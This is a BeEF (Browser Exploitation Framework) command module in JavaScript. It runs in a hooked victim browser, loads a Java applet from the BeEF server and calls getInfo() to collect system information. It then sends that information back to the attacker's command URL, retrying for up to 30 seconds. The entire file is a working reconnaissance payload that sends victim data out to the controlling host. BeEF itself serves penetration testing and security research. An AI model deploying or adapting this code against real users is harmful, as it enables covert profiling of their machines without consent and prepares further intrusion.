//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var internal_counter = 0;
	var timeout = 30;
	var output;

	beef.dom.attachApplet('getSystemInfo', 'getSystemInfo', 'getSystemInfo', "http://"+beef.net.host+":"+beef.net.port+"/", null, null);

	if (beef.browser.isFF()) {

		output = document.getSystemInfo.getInfo();
		if (output) beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"));
		beef.dom.detachApplet('getSystemInfo');

	} else {

		function waituntilok() {
			try {
				output = document.getSystemInfo.getInfo();
				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"));
				beef.dom.detachApplet('getSystemInfo');
				return;
			} catch (e) {
				internal_counter++;
				if (internal_counter > timeout) {
					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=Timeout after '+timeout+' seconds');
					beef.dom.detachApplet('getSystemInfo');
					return;
				}
				setTimeout(function() {waituntilok()},1000);
			}
		}

		setTimeout(function() {waituntilok()},5000);

	}
});

